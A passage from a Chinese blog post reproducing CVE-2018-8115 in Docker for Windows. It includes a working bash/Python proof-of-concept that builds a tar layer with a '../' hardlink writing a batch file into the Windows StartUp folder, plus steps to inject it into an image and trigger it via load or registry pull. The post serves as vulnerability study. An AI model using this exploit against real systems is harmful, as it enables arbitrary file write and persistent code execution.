</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-shell data-lang=shell><span class=cp>#!/bin/bash
</span><span class=cp></span>
write_base_layer<span class=o>()</span> <span class=o>{</span>
  <span class=c1># Tar containing hive files and dummy Dockerfile</span>
  base64 -d <span class=s>&lt;&lt;&#39;EOF&#39; | gunzip -c
</span><span class=s>H4sIANXIjFoAA+3d3W7bdBjHcbdaQYoYTGy89MyHcNL43elBQU6bqhUr6QtjVEJDJnOyqC9Bjrt2
</span><span class=s>HO0SuAkkBBfADXDCMTfAEadcQrFju9ip2yWd46zx9yM1cfz4n3hOn7/n6Kdm2z7bcOynjttfkqrr
</span><span class=s>3UOnL+ROCl11LymaKsiqf6uokiTrgiQrmqkL4ln+u3LZSd+zXX9XXvd5hv9xt4RWEx9u1q3d1Y3N
</span><span class=s>rxtLLdexvW7v2OseOSuyLi8rkqLK5pKumrWa4b87FUUXt/Yeb3651ny8t9T2f19sz3NXZKOiSqJ9
</span><span class=s>9TC/2rq2enR1ddqHaKZNqOVTJEm7tv+D5XT/S4qkCqI+4f0aKHn/D97/6nbyLLDWax04btDbOb3G
</span><span class=s>q+Z/XVUS77/sv/+arsnM/0VQR5j/1StmfVWpKLKaqLj2af/pirVjNTr1Hct3YMXWBrd1qxM+rO8N
</span><span class=s>7jqDxzuNaKNH0dq6v3Yn2rBjVU8bbctqrEYbrW8Gt6tW+Nh/nahej+uN6DXWrdWqtbuVfP6H0cK+
</span><span class=s>9cWBv5OX9udZ8LiiXDqVqdknMMOUzWU5OCteOoGpt+S0FfZ/7i2f4s/n18//ujHU/4qi+/1fSBOV
</span><span class=s>vP/Xd5tb4lG35fb6vbZXPbaPe33Hfe64dyt3K6vN7X3x/98NsTrtvUXeUmf+je7zN+T6T5c5/xeC
</span><span class=s>679ym1DLp9zk+k82uf4rwuD9H7r+c9r2yaH3yP9/wHdrzqFnv+5rjD//G5LG53+FGHH+12TTqBlX
</span><span class=s>zv/+lWDm/H8xLHP+T1Yvz/8X1WkfopkW9n/uLZ9y/fWfkjH/q3rQ/1z/TZ7rdNpz/v1cYl2w/FZi
</span><span class=s>WQwW7qW3mZT5V9Sb7d1OEftRBov39bmff/vwyb+//sUhBQAAAIAZ9+z77vFg4V52/Zfz8/PjA1H4
</span><span class=s>84+3L64T/VXncf08Ei+fDdWT7vg/u83mV8HyN/42/QNBCLYPfoIn/mlwf+flD/79y2jMAyH4TODb
</span><span class=s>wVhh/oHwufCeMBderS68P1j3cbgu/OBgQfRvxPlw20V/ZLRteJtet/BOUBgaN/z473evPXwAAAAA
</span><span class=s>ANwKGfmvPfso3xDI+PkvTdUU8l9FGDX/pZh6TRk//xUPy85/JaoZ+a+4Ou1DNNPC/s+95VPGz38p
</span><span class=s>UtD/5L8mj/xXeQX5r/nfPyL/BQAAAAAlQP4rPY78FwAAAABgFmXlv5zWidv1XuSWCBk//6VrKn//
</span><span class=s>sRCj5r9UU5PM8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4+1+yyt9/LgT5r/IK8l//7C+S/wIA
</span><span class=s>AACAEiD/lR5H/gsAAAAAMIuy8l+9tndqu85U81+yRv6rCKN+/69RW9aWx85/XQzL/v7fRDXj+3/j
</span><span class=s>6rQP0UyL8l95t3zKTfJfQf+T/5o88l/lFeS/Pv3sPvkvAAAAACgB8l/pceS/AAAAAACzKCv/9aLv
</span><span class=s>OXl+H9wN8l+yZJD/KsKo+S+zVjPU8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4/kcj6H/yX5NH
</span><span class=s>/qu8gvzXJz9+QP4LAAAAAEqA/Fd6HPkvAAAAAAAAAAAAAAAAAAAAAG+q/wA9MZkjAPAAAA==
</span><span class=s>EOF</span>
<span class=o>}</span>

write_layer<span class=o>()</span> <span class=o>{</span>
  write_base_layer &gt; ./demo.tar

  python3 -c <span class=s1>&#39;
</span><span class=s1>import sys
</span><span class=s1>import time
</span><span class=s1>import tarfile
</span><span class=s1>import tempfile
</span><span class=s1>import struct
</span><span class=s1>
</span><span class=s1>startupfile = \
</span><span class=s1>  &#34;ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/evil.bat&#34;
</span><span class=s1>
</span><span class=s1>with tempfile.NamedTemporaryFile() as script, \
</span><span class=s1>     tarfile.open(sys.argv[1], &#34;w&#34;, format=tarfile.PAX_FORMAT) as tar:
</span><span class=s1>  # Generate new digest every time
</span><span class=s1>  script.write(&#34;echo Hello World {}\r\npause\r\n&#34;.format(time.time()).encode(&#34;ascii&#34;))
</span><span class=s1>  script.flush()
</span><span class=s1>
</span><span class=s1>  tar.add(script.name, arcname=&#34;Files/script.bat&#34;)
</span><span class=s1>
</span><span class=s1>  # Hardlink for startup script
</span><span class=s1>  info = tarfile.TarInfo(&#34;Files\\../../../../../../../../&#34; + startupfile)
</span><span class=s1>  info.type = tarfile.LNKTYPE
</span><span class=s1>  info.linkname = &#34;Files\\script.bat&#34;
</span><span class=s1>  tar.addfile(info)
</span><span class=s1>&#39;</span> ./evil.tar

  cat &lt; ./demo.tar &gt; ./layer.tar
  tar --concatenate --absolute-names -f ./layer.tar ./evil.tar
<span class=o>}</span>

write_layer
</code></pre></td></tr></table></div></div><p>执行脚本后可得到 <code>layer.tar</code>，该文件为需要添加的 layer。</p><p>接着进行恶意文件层的构造，在前面解压的 <code>nanoserver</code> 镜像目录中进行如下操作：</p><ul><li>新建目录，使用 <code>123456</code> 的 <code>SHA256</code> 作为目录名，也就是 <code>8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92</code></li><li>将上方导出的 <code>layer.tar</code> 复制到新建的目录中</li><li>将 <code>3128d665ad88b5e4d2111974265579b4b0fc70bfe10da79c27fc984f31098431</code> 目录中的 <code>json</code> 与 <code>VERSION</code> 复制到新建的目录中</li><li>修改新目录中的 <code>json</code> 文件的 <code>id</code> 字段为 <code>8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92</code>，修改 <code>parent</code> 字段为 <code>3128d665ad88b5e4d2111974265579b4b0fc70bfe10da79c27fc984f31098431</code></li></ul><p>经过上面这几步，存放恶意文件的层就构造好了，目录结构如下：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6632e-fcfd-11ea-aa4e-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b6632e-fcfd-11ea-aa4e-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6632e-fcfd-11ea-aa4e-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6632e-fcfd-11ea-aa4e-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6632e-fcfd-11ea-aa4e-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6632e-fcfd-11ea-aa4e-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b6632e-fcfd-11ea-aa4e-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>最后来构建恶意镜像：</p><ul><li>获得 <code>8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92\layer.tar</code> 的 <code>SHA256</code>，如下：</li></ul><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b689ae-fcfd-11ea-ae6d-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b689ae-fcfd-11ea-ae6d-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b689ae-fcfd-11ea-ae6d-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b689ae-fcfd-11ea-ae6d-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b689ae-fcfd-11ea-ae6d-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b689ae-fcfd-11ea-ae6d-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b689ae-fcfd-11ea-ae6d-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><ul><li>修改 <code>8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12.json</code> 文件的 <code>rootfs</code> 的 <code>diff_ids</code> 字段，添加一行到末尾，内容为 <code>sha256:上面求得的SHA256小写</code>，也就是 <code>sha256:0cb4fea09b841abe6b5ed4ff85e9a9b8c0ad88c074a35327cfa5989b1a05ebbb</code>，如下：</li></ul><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6b058-fcfd-11ea-b58d-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b6b058-fcfd-11ea-b58d-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6b058-fcfd-11ea-b58d-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6b058-fcfd-11ea-b58d-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6b058-fcfd-11ea-b58d-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6b058-fcfd-11ea-b58d-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b6b058-fcfd-11ea-b58d-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><ul><li>获得修改后的 <code>8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12.json</code> 文件的 <code>SHA256</code>，将其转为小写当作本文件的名字，如下：</li></ul><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6eb76-fcfd-11ea-93b1-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b6eb76-fcfd-11ea-93b1-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6eb76-fcfd-11ea-93b1-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6eb76-fcfd-11ea-93b1-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6eb76-fcfd-11ea-93b1-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b6eb76-fcfd-11ea-93b1-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b6eb76-fcfd-11ea-93b1-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><ul><li>修改 <code>manifest.json</code> 文件：<ul><li>修改 <code>Config</code> 字段为上方修改后的文件名，也就是 <code>6415332bfe2d8d3b11ccf553f98d5fba400897dca617a4eb9c0f8835853ad7cc.json</code></li><li>在 <code>Layers</code> 字段末尾新增一行，内容为上方恶意文件层的路径，也就是 <code>8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92\\layer.tar</code></li></ul></li></ul><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b719ac-fcfd-11ea-9b1a-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b719ac-fcfd-11ea-9b1a-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b719ac-fcfd-11ea-9b1a-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b719ac-fcfd-11ea-9b1a-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b719ac-fcfd-11ea-9b1a-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b719ac-fcfd-11ea-9b1a-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b719ac-fcfd-11ea-9b1a-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><ul><li>将所有文件打包成 <code>tar</code> 包</li></ul><p>完成如上步骤，恶意镜像构造好了，现在用 <code>docker load</code> 来测试一下，输入命令 <code>docker load -i nanoserver.tar</code>，可看到恶意文件被写入自启目录 <code>%ProgramData%\Microsoft\Windows\Start Menu\Programs</code> 中，如下：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b73d5e-fcfd-11ea-abbe-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b73d5e-fcfd-11ea-abbe-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b73d5e-fcfd-11ea-abbe-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b73d5e-fcfd-11ea-abbe-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b73d5e-fcfd-11ea-abbe-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b73d5e-fcfd-11ea-abbe-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b73d5e-fcfd-11ea-abbe-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><h3 id=最终解决>最终解决</h3><p>通过上面的操作，本地 <code>load</code> 方式是可以触发漏洞的，现在再回过头来看看 <code>pull</code> 时的漏洞触发。这一步失败的原因上面也讲到了，无非就是 <code>Registry</code> 无法识别我们传上去的 <code>config.json</code> 与 <code>manifest.json</code>，解决这个问题还是得多看看<a href=https://docs.docker.com/registry/spec/api/ target=_blank rel="noopener noreffer">官方文档</a>，我在这里花了很多时间，结合网上的资料，某一天突然想到，既然提示另两个 blob 找不到，那我配置文件中不写它们不就完了，<code>config.json</code> 与 <code>manifest.json</code> 里面的 blob 就只写自己构造的恶意文件那一层就行了，于是修改后的配置文件变成了这样：</p><p><figure><a class=lightgallery href=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b76462-fcfd-11ea-b99f-80fa5b238e56.png data-thumbnail=/images/CVE-2018-8115漏洞复现/04b76462-fcfd-11ea-b99f-80fa5b238e56.png data-sub-html="<h2> </h2><p> </p>"><img class=lazyload src=/svg/loading.min.svg data-src=/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b76462-fcfd-11ea-b99f-80fa5b238e56.png data-srcset="/images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b76462-fcfd-11ea-b99f-80fa5b238e56.png, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b76462-fcfd-11ea-b99f-80fa5b238e56.png 1.5x, /images/CVE-2018-8115%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0/04b76462-fcfd-11ea-b99f-80fa5b238e56.png 2x" data-sizes=auto alt=/images/CVE-2018-8115漏洞复现/04b76462-fcfd-11ea-b99f-80fa5b238e56.png></a><figcaption class=image-caption></figcaption></figure></p><p>可以看到其实就是 <code>config.json</code> 与 <code>manifest.json</code> 中多余的镜像层被删掉了，删了之后按照<a href=#%e5%a4%8d%e7%8e%b0%e6%bc%8f%e6%b4%9e rel>复现漏洞</a>的步骤走，就成功使用 <code>pull</code> 实现了漏洞攻击。</p><hr><h2 id=end>END</h2><p>其实大概的漏洞原理经过复现与网上的资料学习，了解得差不多了。大概就是 Docker 将镜像存储在本地时，需要将 layer 内的文件根据它的路径解压到本地，但由于对路径处理的有问题，直接使用包含 <code>../</code> 的路径解压了文件，导致攻击者可以控制文件创建的路径，从而实现任意文件写入。需要注意的是，这并不是 Docker 的问题，而是微软提供的 <code>API</code> 接口有问题，所以该漏洞也只存在与 <code>Docker for Windows</code> 上。</p><p>按照分析流程，现在应该分析一波代码，弄清楚具体出现问题的漏洞点，但无奈对 Go 语言的不太熟，这种大项目的源码又很复杂，所以现在的水平还无法对其进行源码分析，这里总结了下面几个链接，可以参考参考：</p><blockquote><p>Docker 未修复漏洞的版本：&lt;= <a href=https://github.com/moby/moby/releases/tag/v18.03.1-ce-rc1 target=_blank rel="noopener noreffer">v18.03.1-ce-rc1</a></p><p>Docker 漏洞版本的相邻 tag：<a href="https://github.com/moby/moby/tags?after=v18.06.0-ce-rc1">https://github.com/moby/moby/tags?after=v18.06.0-ce-rc1</a></p><p>微软开始修复漏洞的 commit：<a href="https://github.com/microsoft/hcsshim/commit/79062a5b985d24ef42a4252a1b63a93ec450e407?branch=79062a5b985d24ef42a4252a1b63a93ec450e407&diff=split#">https://github.com/microsoft/hcsshim/commit/79062a5b985d24ef42a4252a1b63a93ec450e407?branch=79062a5b985d24ef42a4252a1b63a93ec450e407&diff=split#</a></p><p>hcsshim v0.6.8~v0.6.10 之间的差异：<a href=https://github.com/microsoft/hcsshim/compare/v0.6.8...v0.6.10>https://github.com/microsoft/hcsshim/compare/v0.6.8...v0.6.10</a></p><p>镜像存储源码分析：<a href=https://www.infoq.cn/article/docker-source-code-analysis-part11>https://www.infoq.cn/article/docker-source-code-analysis-part11</a></p></blockquote><hr><h2 id=参考链接>参考链接</h2><div class="details admonition abstract open"><div class="details-summary admonition-title"><i class="icon fas fa-list-ul fa-fw"></i>参考链接<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content><p>漏洞发现者官方 Poc：<a href=https://hansmi.ch/articles/2018-04-windows-hcsshim-security#poc>https://hansmi.ch/articles/2018-04-windows-hcsshim-security#poc</a></p><p>Docker 官方命令说明：</p><p><a href=https://docs.docker.com/engine/reference/commandline/save/>https://docs.docker.com/engine/reference/commandline/save/</a></p><p><a href=https://docs.docker.com/engine/reference/commandline/load/>https://docs.docker.com/engine/reference/commandline/load/</a></p><p>Docker Registry 官方文档：</p><p><a href=https://docs.docker.com/registry/spec/api/>https://docs.docker.com/registry/spec/api/</a></p><p><a href=https://docs.docker.com/registry/spec/manifest-v2-2/>https://docs.docker.com/registry/spec/manifest-v2-2/</a></p><p>Docker 搭建 registry：</p><p><a href=https://uzshare.com/view/793256>https://uzshare.com/view/793256</a></p><p><a href=https://yeasy.gitbook.io/docker_practice/repository/registry>https://yeasy.gitbook.io/docker_practice/repository/registry</a></p><p>Docker 的 Pull Digest 和 Image ID：<a href=https://developer.aliyun.com/article/57752>https://developer.aliyun.com/article/57752</a></p><p>Docker 镜像存储详细分析：<a href=https://www.cnblogs.com/sparkdev/p/9121188.html>https://www.cnblogs.com/sparkdev/p/9121188.html</a></p><p>Docker 镜像格式规范：<a href=https://ying-zhang.github.io/yi/2017/x-docker-image-spec-v1.2/>https://ying-zhang.github.io/yi/2017/x-docker-image-spec-v1.2/</a></p></div></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2020-09-23</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://hstar.me/2020/09/cve-2018-8115-analysis/ data-title="CVE-2018-8115 漏洞复现" data-hashtags=漏洞复现><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://hstar.me/2020/09/cve-2018-8115-analysis/ data-hashtag=漏洞复现><i class="fab fa-facebook-square fa-fw"></i></a><a href=javascript:void(0); title="分享到 WhatsApp" data-sharer=whatsapp data-url=https://hstar.me/2020/09/cve-2018-8115-analysis/ data-title="CVE-2018-8115 漏洞复现" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href=javascript:void(0); title="分享到 Line" data-sharer=line data-url=https://hstar.me/2020/09/cve-2018-8115-analysis/ data-title="CVE-2018-8115 漏洞复现"><i data-svg-src=/lib/simple-icons/icons/line.min.svg></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://hstar.me/2020/09/cve-2018-8115-analysis/ data-title="CVE-2018-8115 漏洞复现" data-image=/images/CVE-2018-8115漏洞复现/docker-and-windows.jpg><i class="fab fa-weibo fa-fw"></i></a><a href=javascript:void(0); title="分享到 Myspace" data-sharer=myspace data-url=https://hstar.me/2020/09/cve-2018-8115-analysis/ data-title="CVE-2018-8115 漏洞复现" data-description="Docker for Windows"><i data-svg-src=/lib/simple-icons/icons/myspace.min.svg></i></a><a href=javascript:void(0); title="分享到 Blogger" data-sharer=blogger data-url=https://hstar.me/2020/09/cve-2018-8115-analysis/ data-title="CVE-2018-8115 漏洞复现" data-description="Docker for Windows"><i class="fab fa-blogger fa-fw"></i></a><a href=javascript:void(0); title="分享到 Evernote" data-sharer=evernote data-url=https://hstar.me/2020/09/cve-2018-8115-analysis/ data-title="CVE-2018-8115 漏洞复现"><i class="fab fa-evernote fa-fw"></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/>漏洞复现</a></section><section><span><a href=javascript:void(0); onclick=window.history.back();>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/2020/09/note-software-test/ class=prev rel=prev title=笔记软件测试><i class="fas fa-angle-left fa-fw"></i>笔记软件测试</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.68.3">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i>LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2019 - 2020</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/about/ target=_blank>HStar</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i></a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><link rel=stylesheet href=/lib/lightgallery/lightgallery.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=stylesheet href=/lib/katex/copy-tex.min.css><script type=text/javascript src=/lib/valine/Valine.min.js></script><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lunr/lunr.stemmer.support.min.js></script><script type=text/javascript src=/lib/lunr/lunr.zh.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js></script><script type=text/javascript src=/lib/katex/auto-render.min.js></script><script type=text/javascript src=/lib/katex/copy-tex.min.js></script><script type=text/javascript src=/lib/katex/mhchem.min.js></script><script type=text/javascript>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{"valine":{"appId":"EjHP7h8csVSDkWTeUAebIYYQ-MdYXbMMI","appKey":"twlb57KBtNWNBgPyyVHX3tAQ","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_he